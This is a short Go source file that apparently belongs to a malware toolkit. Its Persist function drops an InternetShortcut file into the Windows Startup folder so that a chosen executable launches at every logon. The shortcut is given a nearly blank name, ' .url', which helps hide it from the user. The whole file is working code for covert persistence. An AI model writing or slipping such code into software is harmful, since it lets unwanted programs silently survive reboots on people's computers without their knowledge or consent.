package reg

import (
	"os"
	"path/filepath"
)

func Persist(path string) error {
	kpath := filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	if _, err := os.Stat(kpath); os.IsNotExist(err) {
		return err
	}

	kpath = filepath.Join(kpath, " .url")
	f, err := os.Create(kpath)
	if err != nil {
		return err
	}

	n, err := f.Write([]byte("\n[InternetShortcut]\nURL=file://" + path))
	if err != nil && n == 0 {
		return err
	}

	defer f.Close()

	return nil
}
